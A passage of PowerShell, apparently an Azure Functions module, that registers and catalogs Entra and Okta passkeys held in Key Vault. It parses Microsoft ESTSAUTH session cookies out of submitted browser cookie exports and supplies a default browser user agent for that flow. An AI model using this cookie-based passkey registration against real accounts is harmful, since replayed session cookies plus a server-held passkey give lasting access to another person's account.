using namespace System.Net

function Get-RequestBodyObject {
    param(
        [Parameter(Mandatory)]
        $Request
    )

    if ($null -eq $Request.Body) {
        return @{}
    }

    if ($Request.Body -is [string]) {
        if ([string]::IsNullOrWhiteSpace($Request.Body)) {
            return @{}
        }

        return $Request.Body | ConvertFrom-Json -AsHashtable
    }

    if ($Request.Body -is [System.Collections.IDictionary]) {
        return $Request.Body
    }

    return ($Request.Body | ConvertTo-Json -Depth 20 | ConvertFrom-Json -AsHashtable)
}

function Get-RequestValue {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request,

        [Parameter(Mandatory)]
        [string[]]$Names
    )

    foreach ($name in $Names) {
        if ($Body.ContainsKey($name) -and -not [string]::IsNullOrWhiteSpace([string]$Body[$name])) {
            return [string]$Body[$name]
        }

        $queryValue = $null
        if ($null -ne $Request.Query) {
            if ($Request.Query -is [System.Collections.IDictionary]) {
                if ($Request.Query.ContainsKey($name)) {
                    $queryValue = [string]$Request.Query[$name]
                }
            } else {
                $property = $Request.Query.PSObject.Properties[$name]
                if ($property) {
                    $queryValue = [string]$property.Value
                }
            }
        }

        if (-not [string]::IsNullOrWhiteSpace($queryValue)) {
            return $queryValue
        }
    }

    return $null
}

function Get-BodyValue {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        [string[]]$Names
    )

    foreach ($name in $Names) {
        if ($Body.ContainsKey($name)) {
            return $Body[$name]
        }
    }

    return $null
}

function Get-PasskeyObjectValue {
    param(
        [Parameter()]
        $Object,

        [Parameter(Mandatory)]
        [string[]]$Names
    )

    if ($null -eq $Object) {
        return $null
    }

    foreach ($name in $Names) {
        if ($Object -is [System.Collections.IDictionary]) {
            if ($Object.Contains($name)) {
                return $Object[$name]
            }
            continue
        }

        $property = $Object.PSObject.Properties[$name]
        if ($null -ne $property) {
            return $property.Value
        }
    }

    return $null
}

function Get-RegistrationQueueName {
    $queueName = [Environment]::GetEnvironmentVariable('PASSKEY_REGISTRATION_QUEUE_NAME')
    if ([string]::IsNullOrWhiteSpace($queueName)) {
        return 'passkey-registration'
    }

    return $queueName
}

function Get-OktaRegistrationQueueName {
    $queueName = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_REGISTRATION_QUEUE_NAME')
    if ([string]::IsNullOrWhiteSpace($queueName)) {
        return 'okta-passkey-registration'
    }

    return $queueName
}

function Get-EstsAuthCookieFromSource {
    param(
        [Parameter()]
        $CookieSource
    )

    if ($null -eq $CookieSource) {
        return $null
    }

    if ($CookieSource -is [byte[]]) {
        $CookieSource = [System.Text.Encoding]::UTF8.GetString($CookieSource)
    }

    if ($CookieSource -is [string]) {
        $trimmed = $CookieSource.Trim()
        if ([string]::IsNullOrWhiteSpace($trimmed)) {
            return $null
        }

        if ($trimmed.StartsWith('[') -or $trimmed.StartsWith('{') -or $trimmed.StartsWith('"')) {
            try {
                $parsed = $trimmed | ConvertFrom-Json -AsHashtable -Depth 20
                $nestedCookie = Get-EstsAuthCookieFromSource -CookieSource $parsed
                if (-not [string]::IsNullOrWhiteSpace($nestedCookie)) {
                    return $nestedCookie
                }
            } catch {
            }
        }

        foreach ($cookieName in @('ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT')) {
            $match = [regex]::Match($trimmed, "(?:^|;\s*)$cookieName=([^;]+)", [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            if ($match.Success -and -not [string]::IsNullOrWhiteSpace($match.Groups[1].Value)) {
                return $match.Groups[1].Value.Trim()
            }
        }

        return $trimmed
    }

    if ($CookieSource -is [System.Collections.IDictionary]) {
        foreach ($name in @('estsAuth', 'estsAuthCookie', 'ESTSAUTH')) {
            if ($CookieSource.Contains($name) -and -not [string]::IsNullOrWhiteSpace([string]$CookieSource[$name])) {
                return [string]$CookieSource[$name]
            }
        }

        foreach ($name in @('cookies', 'cookieExport', 'cookieJson', 'cookieData', 'browserCookies', 'tokens', 'items')) {
            if ($CookieSource.Contains($name)) {
                $nestedCookie = Get-EstsAuthCookieFromSource -CookieSource $CookieSource[$name]
                if (-not [string]::IsNullOrWhiteSpace($nestedCookie)) {
                    return $nestedCookie
                }
            }
        }

        if ($CookieSource.Contains('name') -and $CookieSource.Contains('value')) {
            $cookieName = [string]$CookieSource['name']
            $cookieValue = [string]$CookieSource['value']
            if ($cookieName -and $cookieValue -and @('ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT') -contains $cookieName.ToUpperInvariant()) {
                return $cookieValue.Trim()
            }
        }

        return $null
    }

    if ($CookieSource -is [System.Collections.IEnumerable]) {
        $candidates = @{}
        foreach ($item in $CookieSource) {
            if ($item -is [System.Collections.IDictionary] -and $item.Contains('name') -and $item.Contains('value')) {
                $cookieName = [string]$item['name']
                $cookieValue = [string]$item['value']
                if ($cookieName -and $cookieValue -and @('ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT') -contains $cookieName.ToUpperInvariant()) {
                    $candidates[$cookieName.ToUpperInvariant()] = $cookieValue.Trim()
                    continue
                }
            }

            $nestedCookie = Get-EstsAuthCookieFromSource -CookieSource $item
            if (-not [string]::IsNullOrWhiteSpace($nestedCookie) -and -not $candidates.Contains('ESTSAUTH')) {
                $candidates['ESTSAUTH'] = $nestedCookie
            }
        }

        foreach ($cookieName in @('ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT')) {
            if ($candidates.Contains($cookieName)) {
                return [string]$candidates[$cookieName]
            }
        }
    }

    return $null
}

function Resolve-EstsAuthCookie {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request
    )

    $directCookie = Get-RequestValue -Body $Body -Request $Request -Names @('estsAuth', 'estsAuthCookie')
    if (-not [string]::IsNullOrWhiteSpace($directCookie)) {
        $parsedDirectCookie = Get-EstsAuthCookieFromSource -CookieSource $directCookie
        if (-not [string]::IsNullOrWhiteSpace($parsedDirectCookie)) {
            return $parsedDirectCookie
        }
    }

    $cookieSource = Get-BodyValue -Body $Body -Names @('cookies', 'cookieExport', 'cookieJson', 'cookieData', 'browserCookies', 'tokens')
    if ($null -ne $cookieSource) {
        $parsedCookie = Get-EstsAuthCookieFromSource -CookieSource $cookieSource
        if (-not [string]::IsNullOrWhiteSpace($parsedCookie)) {
            return $parsedCookie
        }
    }

    $queryCookie = Get-RequestValue -Body $Body -Request $Request -Names @('cookies', 'cookieExport', 'cookieJson', 'cookieData', 'browserCookies', 'tokens')
    if (-not [string]::IsNullOrWhiteSpace($queryCookie)) {
        return Get-EstsAuthCookieFromSource -CookieSource $queryCookie
    }

    return $null
}

function Get-RequiredSetting {
    param(
        [Parameter(Mandatory)]
        [string]$Name
    )

    $value = [Environment]::GetEnvironmentVariable($Name)
    if ([string]::IsNullOrWhiteSpace($value)) {
        throw [System.ArgumentException]::new("Missing required setting '$Name'.")
    }

    return $value
}

function New-DefaultPasskeyDisplayName {
    $randomSuffix = Get-Random -Minimum 1000 -Maximum 10000
    return "pk$randomSuffix"
}

function Get-DefaultPasskeyUserAgent {
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0'
}

function Get-DefaultPasskeyRedirectUri {
    return 'https://mysignins.microsoft.com'
}

function Normalize-PasskeyUserAgent {
    param(
        [Parameter()]
        [AllowNull()]
        [object]$UserAgent
    )

    $candidate = ''
    if ($null -ne $UserAgent) {
        $candidate = [string]$UserAgent
    }

    $candidate = $candidate.Replace([string][char]0, '')
    $candidate = $candidate.Replace("`r", ' ')
    $candidate = $candidate.Replace("`n", ' ').Trim()
    if ([string]::IsNullOrWhiteSpace($candidate)) {
        return Get-DefaultPasskeyUserAgent
    }

    return $candidate
}

function Resolve-RequestUserAgent {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request
    )

    $requestUserAgent = Get-RequestValue -Body $Body -Request $Request -Names @('userAgent', 'useragent', 'user_agent')
    return Normalize-PasskeyUserAgent -UserAgent $requestUserAgent
}

function Normalize-PasskeyRedirectUri {
    param(
        [Parameter()]
        [AllowNull()]
        [object]$RedirectUri
    )

    $candidate = ''
    if ($null -ne $RedirectUri) {
        $candidate = [string]$RedirectUri
    }

    $candidate = $candidate.Replace([string][char]0, '')
    $candidate = $candidate.Replace("`r", ' ')
    $candidate = $candidate.Replace("`n", ' ').Trim()
    if ([string]::IsNullOrWhiteSpace($candidate)) {
        return Get-DefaultPasskeyRedirectUri
    }

    $parsedUri = $null
    if (-not [System.Uri]::TryCreate($candidate, [System.UriKind]::Absolute, [ref]$parsedUri)) {
        throw [System.ArgumentException]::new("The redirectUri value '$candidate' is not a valid absolute URI.")
    }

    if ($parsedUri.Scheme -notin @('http', 'https')) {
        throw [System.ArgumentException]::new("The redirectUri value '$candidate' must use http or https.")
    }

    if (-not [string]::IsNullOrWhiteSpace($parsedUri.Query) -or -not [string]::IsNullOrWhiteSpace($parsedUri.Fragment)) {
        throw [System.ArgumentException]::new("The redirectUri value '$candidate' must not include a query string or fragment.")
    }

    return $candidate
}

function Resolve-RequestRedirectUri {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request
    )

    return Normalize-PasskeyRedirectUri -RedirectUri ([Environment]::GetEnvironmentVariable('PASSKEY_ENTRA_PORTAL_ORIGIN'))
}

function Get-PasskeyFunctionConfiguration {
    $allowLocalCredentials = [Environment]::GetEnvironmentVariable('PASSKEY_ALLOW_LOCAL_CREDENTIALS') -eq 'true'
    $keyVaultAccessToken = if ($allowLocalCredentials) { [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN') } else { $null }

    return [ordered]@{
        TenantId = Get-RequiredSetting -Name 'PASSKEY_TENANT_ID'
        KeyVaultName = Get-RequiredSetting -Name 'PASSKEY_KEYVAULT_NAME'
        ManagedIdentityClientId = [Environment]::GetEnvironmentVariable('PASSKEY_MANAGED_IDENTITY_CLIENT_ID')
        KeyVaultAccessToken = $keyVaultAccessToken
    }
}

function Get-OktaFunctionConfiguration {
    $allowLocalCredentials = [Environment]::GetEnvironmentVariable('PASSKEY_ALLOW_LOCAL_CREDENTIALS') -eq 'true'
    $keyVaultAccessToken = if ($allowLocalCredentials) { [Environment]::GetEnvironmentVariable('PASSKEY_KEYVAULT_ACCESS_TOKEN') } else { $null }
    $oktaDomain = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_DOMAIN')

    return [ordered]@{
        KeyVaultName = Get-RequiredSetting -Name 'PASSKEY_KEYVAULT_NAME'
        ManagedIdentityClientId = [Environment]::GetEnvironmentVariable('PASSKEY_MANAGED_IDENTITY_CLIENT_ID')
        KeyVaultAccessToken = $keyVaultAccessToken
        OktaDomain = $oktaDomain
    }
}

function Resolve-OktaDomain {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request
    )

    $domain = [Environment]::GetEnvironmentVariable('PASSKEY_OKTA_DOMAIN')

    if ([string]::IsNullOrWhiteSpace($domain)) {
        throw [System.ArgumentException]::new("Missing required server setting 'PASSKEY_OKTA_DOMAIN'.")
    }

    return $domain.Trim()
}

function Resolve-OktaAccessToken {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body,

        [Parameter(Mandatory)]
        $Request
    )

    $token = Get-RequestValue -Body $Body -Request $Request -Names @('accessToken', 'oktaAccessToken')
    if ([string]::IsNullOrWhiteSpace($token) -and $Request.Headers) {
        $authorization = $null
        if ($Request.Headers -is [System.Collections.IDictionary]) {
            if ($Request.Headers.ContainsKey('Authorization')) {
                $authorization = [string]$Request.Headers['Authorization']
            }
        } else {
            $property = $Request.Headers.PSObject.Properties['Authorization']
            if ($property) {
                $authorization = [string]$property.Value
            }
        }

        if ($authorization -and $authorization -match '^(?i)Bearer\s+(.+)$') {
            $token = $Matches[1].Trim()
        }
    }

    if ([string]::IsNullOrWhiteSpace($token)) {
        throw [System.ArgumentException]::new("Missing Okta user access token. Provide 'accessToken' or a Bearer Authorization header.")
    }

    return $token
}

function Get-ManagedIdentityAccessToken {
    param(
        [Parameter(Mandatory)]
        [string]$Resource,

        [Parameter()]
        [string]$ClientId
    )

    $identityEndpoint = [Environment]::GetEnvironmentVariable('IDENTITY_ENDPOINT')
    $identityHeader = [Environment]::GetEnvironmentVariable('IDENTITY_HEADER')
    if (-not [string]::IsNullOrWhiteSpace($identityEndpoint) -and -not [string]::IsNullOrWhiteSpace($identityHeader)) {
        $uri = "${identityEndpoint}?resource=$([uri]::EscapeDataString($resource))&api-version=2019-08-01"
        if (-not [string]::IsNullOrWhiteSpace($clientId)) {
            $uri += "&client_id=$([uri]::EscapeDataString($clientId))"
        }

        $tokenResponse = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ 'X-IDENTITY-HEADER' = $identityHeader }
        if (-not [string]::IsNullOrWhiteSpace([string]$tokenResponse.access_token)) {
            return [string]$tokenResponse.access_token
        }
    }

    $msiEndpoint = [Environment]::GetEnvironmentVariable('MSI_ENDPOINT')
    $msiSecret = [Environment]::GetEnvironmentVariable('MSI_SECRET')
    if (-not [string]::IsNullOrWhiteSpace($msiEndpoint) -and -not [string]::IsNullOrWhiteSpace($msiSecret)) {
        $uri = "${msiEndpoint}?resource=$([uri]::EscapeDataString($resource))&api-version=2017-09-01"
        if (-not [string]::IsNullOrWhiteSpace($clientId)) {
            $uri += "&clientid=$([uri]::EscapeDataString($clientId))"
        }

        $tokenResponse = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Secret = $msiSecret }
        if (-not [string]::IsNullOrWhiteSpace([string]$tokenResponse.access_token)) {
            return [string]$tokenResponse.access_token
        }
    }

    return $null
}

function Get-KeyVaultAccessToken {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration
    )

    if (-not [string]::IsNullOrWhiteSpace([string]$Configuration.KeyVaultAccessToken)) {
        return [string]$Configuration.KeyVaultAccessToken
    }

    $token = Get-ManagedIdentityAccessToken -Resource 'https://vault.azure.net' -ClientId ([string]$Configuration.ManagedIdentityClientId)
    if (-not [string]::IsNullOrWhiteSpace($token)) {
        return $token
    }

    try {
        $token = az account get-access-token --resource 'https://vault.azure.net' --query accessToken -o tsv 2>$null
        if (-not [string]::IsNullOrWhiteSpace([string]$token)) {
            return ([string]$token).Trim()
        }
    } catch {
    }

    throw "Unable to acquire a Key Vault access token. Set PASSKEY_KEYVAULT_ACCESS_TOKEN, run in Azure with managed identity, or sign in with Azure CLI."
}

function Get-StorageAccessToken {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration
    )

    $configuredToken = [Environment]::GetEnvironmentVariable('PASSKEY_STORAGE_ACCESS_TOKEN')
    if (-not [string]::IsNullOrWhiteSpace($configuredToken)) {
        return $configuredToken
    }

    $token = Get-ManagedIdentityAccessToken -Resource 'https://storage.azure.com/' -ClientId ([string]$Configuration.ManagedIdentityClientId)
    if (-not [string]::IsNullOrWhiteSpace($token)) {
        return $token
    }

    try {
        $token = az account get-access-token --resource 'https://storage.azure.com/' --query accessToken -o tsv 2>$null
        if (-not [string]::IsNullOrWhiteSpace([string]$token)) {
            return ([string]$token).Trim()
        }
    } catch {
    }

    throw "Unable to acquire a Storage access token. Set PASSKEY_STORAGE_ACCESS_TOKEN, run in Azure with managed identity, or sign in with Azure CLI."
}

function Get-StorageBlobServiceUri {
    $blobServiceUri = [Environment]::GetEnvironmentVariable('AzureWebJobsStorage__blobServiceUri')
    if ([string]::IsNullOrWhiteSpace($blobServiceUri)) {
        throw [System.ArgumentException]::new("Missing required setting 'AzureWebJobsStorage__blobServiceUri'.")
    }

    return $blobServiceUri.TrimEnd('/')
}

function Get-StorageTableServiceUri {
    $tableServiceUri = [Environment]::GetEnvironmentVariable('AzureWebJobsStorage__tableServiceUri')
    if ([string]::IsNullOrWhiteSpace($tableServiceUri)) {
        throw [System.ArgumentException]::new("Missing required setting 'AzureWebJobsStorage__tableServiceUri'.")
    }

    return $tableServiceUri.TrimEnd('/')
}

function Get-PasskeyCatalogTableName {
    $tableName = [Environment]::GetEnvironmentVariable('PASSKEY_CATALOG_TABLE_NAME')
    if ([string]::IsNullOrWhiteSpace($tableName)) {
        return 'PasskeyCredentials'
    }
    if ($tableName -notmatch '^[A-Za-z0-9]+$') {
        throw [System.ArgumentException]::new('PASSKEY_CATALOG_TABLE_NAME must contain only letters and numbers.')
    }
    return $tableName
}

$script:PasskeyCatalogTableEnsured = @{}

function Get-DeterministicPasskeyRecordId {
    param([Parameter(Mandatory)][string]$Name)

    $namespaceBytes = [Convert]::FromHexString('6ba7b8119dad11d180b400c04fd430c8')
    $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($Name)
    $inputBytes = [byte[]]::new($namespaceBytes.Length + $nameBytes.Length)
    [Array]::Copy($namespaceBytes, 0, $inputBytes, 0, $namespaceBytes.Length)
    [Array]::Copy($nameBytes, 0, $inputBytes, $namespaceBytes.Length, $nameBytes.Length)
    $hash = [System.Security.Cryptography.SHA1]::HashData($inputBytes)
    $uuidBytes = [byte[]]$hash[0..15]
    $uuidBytes[6] = ($uuidBytes[6] -band 0x0f) -bor 0x50
    $uuidBytes[8] = ($uuidBytes[8] -band 0x3f) -bor 0x80
    $hex = [Convert]::ToHexString($uuidBytes).ToLowerInvariant()
    return "$($hex.Substring(0,8))-$($hex.Substring(8,4))-$($hex.Substring(12,4))-$($hex.Substring(16,4))-$($hex.Substring(20,12))"
}

function Get-StorageTableHeaders {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration
    )

    return @{
        Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"
        'x-ms-version' = '2023-11-03'
        'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R')
        Accept = 'application/json;odata=nometadata'
        DataServiceVersion = '3.0;NetFx'
        MaxDataServiceVersion = '3.0;NetFx'
    }
}

function Ensure-PasskeyCatalogTable {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration
    )

    $tableName = Get-PasskeyCatalogTableName
    if ($script:PasskeyCatalogTableEnsured.ContainsKey($tableName)) {
        return
    }
    try {
        Invoke-WebRequest -Method POST -Uri "$(Get-StorageTableServiceUri)/Tables" `
            -Headers (Get-StorageTableHeaders -Configuration $Configuration) `
            -ContentType 'application/json' -Body (@{ TableName = $tableName } | ConvertTo-Json -Compress) | Out-Null
    } catch {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
        if ($statusCode -ne 409) {
            throw
        }
    }
    $script:PasskeyCatalogTableEnsured[$tableName] = $true
}

function New-PasskeyCatalogRecord {
    param(
        [Parameter(Mandatory)]
        [ValidateSet('entra', 'okta')]
        [string]$Provider,

        [Parameter(Mandatory)]
        [hashtable]$Credential
    )

    $keyVaultValue = Get-PasskeyObjectValue -Object $Credential -Names @('keyVault')
    $keyVault = if ($keyVaultValue -is [System.Collections.IDictionary]) { [hashtable]$keyVaultValue } else { @{} }
    $credentialId = [string](Get-PasskeyObjectValue -Object $Credential -Names @('credentialId'))
    $rpId = [string](Get-PasskeyObjectValue -Object $Credential -Names @('relyingParty', 'rpId'))
    $userName = [string](Get-PasskeyObjectValue -Object $Credential -Names @('userName', 'username'))
    $vaultName = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('vaultName'))
    $keyName = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('keyName'))
    $keyId = [string](Get-PasskeyObjectValue -Object $keyVault -Names @('keyId'))
    if (@($credentialId, $rpId, $userName, $vaultName, $keyName, $keyId).Where({ [string]::IsNullOrWhiteSpace($_) }).Count -gt 0) {
        throw [System.ArgumentException]::new('Credential cataloging requires credentialId, relyingParty, userName, and complete Key Vault coordinates.')
    }
    $now = (Get-Date).ToUniversalTime().ToString('o')
    $createdAt = [string](Get-PasskeyObjectValue -Object $Credential -Names @('createdDateTime', 'createdAt'))
    if ([string]::IsNullOrWhiteSpace($createdAt)) { $createdAt = $now }
    $providerValue = Get-PasskeyObjectValue -Object $Credential -Names @($Provider)
    $providerMetadata = if ($providerValue -is [System.Collections.IDictionary]) { [hashtable]$providerValue } else { @{} }
    $userHandleValue = Get-PasskeyObjectValue -Object $Credential -Names @('userHandle')
    $displayNameValue = Get-PasskeyObjectValue -Object $Credential -Names @('displayName')
    $urlValue = Get-PasskeyObjectValue -Object $Credential -Names @('url')
    $signCountValue = Get-PasskeyObjectValue -Object $Credential -Names @('signCount')
    if ($null -eq $signCountValue) { $signCountValue = Get-PasskeyObjectValue -Object $Credential -Names @('counter') }
    $signCount = if ($null -eq $signCountValue -or [string]::IsNullOrWhiteSpace([string]$signCountValue)) { 0 } else { [int]$signCountValue }
    return [ordered]@{
        schemaVersion = '1'
        recordId = Get-DeterministicPasskeyRecordId -Name "passkey:${Provider}:$($vaultName.ToLowerInvariant()):${credentialId}"
        provider = $Provider
        credentialId = $credentialId
        rpId = $rpId
        userHandle = if ([string]::IsNullOrWhiteSpace([string]$userHandleValue)) { $null } else { [string]$userHandleValue }
        userName = $userName
        displayName = if ([string]::IsNullOrWhiteSpace([string]$displayNameValue)) { $userName } else { [string]$displayNameValue }
        origin = if ([string]::IsNullOrWhiteSpace([string]$urlValue)) { $null } else { [string]$urlValue }
        keyVault = [ordered]@{ vaultName = $vaultName; keyName = $keyName; keyId = $keyId }
        status = 'active'
        signCount = $signCount
        createdAt = $createdAt
        updatedAt = $now
        providerMetadata = $providerMetadata
    }
}

function Save-PasskeyCatalogRecord {
    param(
        [Parameter(Mandatory)]
        [ValidateSet('entra', 'okta')]
        [string]$Provider,

        [Parameter(Mandatory)]
        [hashtable]$Credential,

        [Parameter(Mandatory)]
        [hashtable]$Configuration,

        [Parameter()]
        [hashtable]$Extensions = @{}
    )

    Ensure-PasskeyCatalogTable -Configuration $Configuration
    $record = New-PasskeyCatalogRecord -Provider $Provider -Credential $Credential
    foreach ($entry in $Extensions.GetEnumerator()) {
        $record[$entry.Key] = $entry.Value
    }
    $entity = [ordered]@{
        PartitionKey = ([string]$record.keyVault.vaultName).ToLowerInvariant()
        RowKey = $record.recordId
        SchemaVersion = $record.schemaVersion
        Provider = $record.provider
        CredentialId = $record.credentialId
        RpId = $record.rpId
        UserName = $record.userName
        DisplayName = $record.displayName
        KeyVaultName = $record.keyVault.vaultName
        KeyVaultKeyName = $record.keyVault.keyName
        KeyVaultKeyId = $record.keyVault.keyId
        Status = $record.status
        CreatedAt = $record.createdAt
        UpdatedAt = $record.updatedAt
        SignCount = $record.signCount
        RecordJson = ($record | ConvertTo-Json -Depth 20 -Compress)
    }
    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)(PartitionKey='$($entity.PartitionKey)',RowKey='$($entity.RowKey)')"
    $headers = Get-StorageTableHeaders -Configuration $Configuration
    Invoke-WebRequest -Method PUT -Uri $uri -Headers $headers -ContentType 'application/json' `
        -Body ($entity | ConvertTo-Json -Depth 10 -Compress) | Out-Null
    return $record
}

function Get-PasskeyCatalogRecords {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration,
        [ValidateSet('', 'entra', 'okta')]
        [string]$Provider = '',
        [string]$RpId,
        [string]$UserName,
        [ValidateSet('', 'active', 'disabled', 'deleted')]
        [string]$Status = '',
        [string]$CredentialId,
        [string]$DisplayName,
        [string]$KeyVaultKeyName
    )

    Ensure-PasskeyCatalogTable -Configuration $Configuration
    $partitionKey = ([string]$Configuration.KeyVaultName).ToLowerInvariant().Replace("'", "''")
    $filter = [uri]::EscapeDataString("PartitionKey eq '$partitionKey'")
    $records = @()
    $nextPartitionKey = $null
    $nextRowKey = $null
    do {
        $query = "`$filter=$filter"
        if ($nextPartitionKey) {
            $query += "&NextPartitionKey=$([uri]::EscapeDataString($nextPartitionKey))"
        }
        if ($nextRowKey) {
            $query += "&NextRowKey=$([uri]::EscapeDataString($nextRowKey))"
        }
        $response = Invoke-WebRequest -Method GET `
            -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)()?$query" `
            -Headers (Get-StorageTableHeaders -Configuration $Configuration)
        $payload = $response.Content | ConvertFrom-Json -Depth 20
        foreach ($entity in @($payload.value)) {
            if ([string]::IsNullOrWhiteSpace([string]$entity.RecordJson)) { continue }
            $record = [string]$entity.RecordJson | ConvertFrom-Json -AsHashtable -Depth 20
            if ($Provider -and [string]$record.provider -ne $Provider) { continue }
            if ($RpId -and [string]$record.rpId -ine $RpId) { continue }
            if ($UserName -and [string]$record.userName -ine $UserName) { continue }
            if ($Status -and [string]$record.status -ne $Status) { continue }
            if ($CredentialId -and [string]$record.credentialId -cne $CredentialId) { continue }
            if ($DisplayName -and [string]$record.displayName -ine $DisplayName) { continue }
            if ($KeyVaultKeyName -and [string]$record.keyVault.keyName -ine $KeyVaultKeyName) { continue }
            $records += ,$record
        }
        $nextPartitionKey = [string]$response.Headers['x-ms-continuation-NextPartitionKey']
        $nextRowKey = [string]$response.Headers['x-ms-continuation-NextRowKey']
    } while (-not [string]::IsNullOrWhiteSpace($nextPartitionKey))
    return $records
}

function Get-PasskeyCatalogRecord {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration,
        [Parameter(Mandatory)]
        [string]$RecordId
    )

    Ensure-PasskeyCatalogTable -Configuration $Configuration
    $partitionKey = ([string]$Configuration.KeyVaultName).ToLowerInvariant().Replace("'", "''")
    $escapedRecordId = $RecordId.Replace("'", "''")
    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCatalogTableName)(PartitionKey='$partitionKey',RowKey='$escapedRecordId')"
    try {
        $entity = Invoke-RestMethod -Method GET -Uri $uri -Headers (Get-StorageTableHeaders -Configuration $Configuration)
    } catch {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
        if ($statusCode -eq 404) { return $null }
        throw
    }
    if ([string]::IsNullOrWhiteSpace([string]$entity.RecordJson)) {
        throw "Passkey catalog record '$RecordId' is malformed."
    }
    return [string]$entity.RecordJson | ConvertFrom-Json -AsHashtable -Depth 20
}

function Invoke-ProviderPasskeyLookup {
    param(
        [Parameter(Mandatory)]
        $Request,
        [Parameter()]
        $TriggerMetadata,
        [Parameter(Mandatory)]
        [ValidateSet('entra', 'okta')]
        [string]$Provider
    )

    try {
        $recordId = $null
        if ($Request.Params -is [System.Collections.IDictionary] -and $Request.Params.ContainsKey('recordId')) {
            $recordId = [string]$Request.Params['recordId']
        }
        if ([string]::IsNullOrWhiteSpace($recordId) -and $TriggerMetadata) {
            $property = $TriggerMetadata.PSObject.Properties['recordId']
            if ($property) { $recordId = [string]$property.Value }
        }

        $configuration = Get-PasskeyFunctionConfiguration
        if (-not [string]::IsNullOrWhiteSpace($recordId)) {
            $record = Get-PasskeyCatalogRecord -Configuration $configuration -RecordId $recordId
            if ($null -eq $record -or [string]$record.provider -ne $Provider) {
                Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::NotFound) -Body ([ordered]@{
                    success = $false
                    provider = $Provider
                    recordId = $recordId
                    error = 'Passkey was not found.'
                }))
                return
            }
            Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::OK) -Body ([ordered]@{
                success = $true
                provider = $Provider
                record = $record
            }))
            return
        }

        $body = @{}
        $rpId = Get-RequestValue -Body $body -Request $Request -Names @('rpId', 'relyingParty')
        $userName = Get-RequestValue -Body $body -Request $Request -Names @('userName', 'username', 'email')
        $status = Get-RequestValue -Body $body -Request $Request -Names @('status')
        $credentialId = Get-RequestValue -Body $body -Request $Request -Names @('credentialId')
        $displayName = Get-RequestValue -Body $body -Request $Request -Names @('displayName')
        $keyVaultKeyName = Get-RequestValue -Body $body -Request $Request -Names @('keyVaultKeyName', 'keyName')
        if ($status -and $status -notin @('active', 'disabled', 'deleted')) {
            throw [System.ArgumentException]::new("status must be 'active', 'disabled', or 'deleted'.")
        }
        $records = @(Get-PasskeyCatalogRecords -Configuration $configuration -Provider $Provider `
            -RpId $rpId -UserName $userName -Status ([string]($status ?? '')) `
            -CredentialId $credentialId -DisplayName $displayName -KeyVaultKeyName $keyVaultKeyName)
        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::OK) -Body ([ordered]@{
            success = $true
            provider = $Provider
            count = $records.Count
            records = $records
        }))
    } catch [System.ArgumentException] {
        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::BadRequest) -Body ([ordered]@{
            success = $false
            provider = $Provider
            error = $_.Exception.Message
        }))
    } catch {
        Push-OutputBinding -Name Response -Value (New-JsonHttpResponse -StatusCode ([System.Net.HttpStatusCode]::InternalServerError) -Body ([ordered]@{
            success = $false
            provider = $Provider
            error = $_.Exception.Message
        }))
    }
}

function Get-RegistrationStatusContainerName {
    $containerName = [Environment]::GetEnvironmentVariable('PASSKEY_REGISTRATION_STATUS_CONTAINER_NAME')
    if ([string]::IsNullOrWhiteSpace($containerName)) {
        return 'passkey-registration-status'
    }

    return $containerName.Trim().ToLowerInvariant()
}

function Get-PostRegistrationLoginDelaySeconds {
    $rawValue = [Environment]::GetEnvironmentVariable('PASSKEY_POST_REGISTRATION_LOGIN_DELAY_SECONDS')
    $delaySeconds = 10
    if (-not [string]::IsNullOrWhiteSpace($rawValue)) {
        [void][int]::TryParse($rawValue, [ref]$delaySeconds)
    }

    if ($delaySeconds -lt 0) {
        return 0
    }

    return $delaySeconds
}

function Get-PostRegistrationLoginHint {
    return [ordered]@{
